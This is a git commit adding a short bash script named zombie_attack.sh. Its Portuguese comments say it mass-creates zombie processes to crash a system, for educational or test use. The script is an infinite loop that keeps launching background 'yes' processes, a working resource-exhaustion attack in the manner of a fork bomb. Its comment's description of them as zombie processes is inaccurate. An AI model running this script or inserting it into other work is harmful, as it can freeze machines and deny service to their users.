33b81a8c756148a2ec399aff7f7f7ead2911a7ae
bruu-carmo <133379148+bruu-carmo@users.noreply.github.com>
2025-07-03 17:23:47 -0300

    Create zombie_attack.sh

---
+++ zombie_attack.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+# zombie_attack.sh
+# ⚠️ CUIDADO: Este script cria processos zumbis em massa que podem travar seu sistema.
+# ⚔️ Uso exclusivo para fins educacionais/testes controlados.
+
+while true; do
+   nohup yes > /dev/null 2>&1 &
+done
